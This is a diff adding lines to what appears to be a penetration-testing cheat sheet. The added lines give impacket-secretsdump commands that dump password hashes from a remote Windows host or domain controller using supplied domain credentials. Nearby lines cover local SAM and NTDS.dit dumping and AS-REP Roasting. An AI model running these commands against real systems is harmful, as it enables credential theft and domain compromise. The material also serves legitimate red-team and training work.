@@ -201,6 +201,12 @@ impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) 
 ```
 impacket-secretdump -ntds NTDS.dit(C:\windows\ntds\) -system SYSTEM local0
 ```
+### impacket-secretsdump
+```
+impacket-secretdump domain/username:password@targeted-ip -sam -system(by smb, need local admin or equivalent privilege)
+
+impacket-secretsdump domain/username:password@targeted-ip(by drsuapi, need domain admin or equivalent privilege)
+```
 
 ### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
 ```
